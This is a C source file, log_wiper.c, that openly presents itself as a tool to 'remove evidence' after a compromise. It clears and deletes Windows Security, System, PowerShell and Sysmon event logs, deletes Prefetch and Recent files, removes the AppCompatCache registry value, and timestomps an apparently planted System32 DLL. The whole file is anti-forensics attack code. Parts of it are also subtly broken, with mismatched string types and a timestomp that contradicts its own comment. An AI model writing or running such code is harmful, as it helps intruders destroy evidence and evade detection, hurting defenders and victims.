// log_wiper.c - Remove evidence from Windows Event Logs
#include <windows.h>
#include <winevt.h>

void wipe_event_logs() {
    LPCWSTR logs[] = {
        L"Security",
        L"System", 
        L"Application",
        L"Microsoft-Windows-PowerShell/Operational",
        L"Windows PowerShell",
        L"Sysmon"
    };
    
    for (int i = 0; i < sizeof(logs)/sizeof(logs[0]); i++) {
        EVT_HANDLE hLog = EvtOpenLog(NULL, logs[i], EvtOpenChannelPath);
        if (hLog) {
            // Clear the log
            EvtClearLog(NULL, logs[i], NULL, 0);
            EvtClose(hLog);
        }
        
        // Also delete the .evtx file directly
        WCHAR path[MAX_PATH];
        swprintf(path, L"C:\\Windows\\System32\\winevt\\Logs\\%s.evtx", logs[i]);
        DeleteFile(path);
    }
    
    // Wipe Prefetch files
    system("del /Q C:\\Windows\\Prefetch\\*");
    
    // Clear recent files
    system("del /Q %APPDATA%\\Microsoft\\Windows\\Recent\\*");
    
    // Clear ShimCache (AppCompatCache)
    // Requires registry manipulation or direct file system access
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
                 "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache", 
                 0, KEY_ALL_ACCESS, &hKey);
    RegDeleteValue(hKey, "AppCompatCache");
    RegCloseKey(hKey);
    
    // Timestomp - modify file times to match system files
    HANDLE hFile = CreateFile(L"C:\\Windows\\System32\\chimera.dll",
                              FILE_WRITE_ATTRIBUTES, 
                              FILE_SHARE_READ, 
                              NULL, 
                              OPEN_EXISTING, 
                              FILE_ATTRIBUTE_NORMAL, 
                              NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        SetFileTime(hFile, &ft, &ft, &ft); // Set all times to current
        CloseHandle(hFile);
    }
}
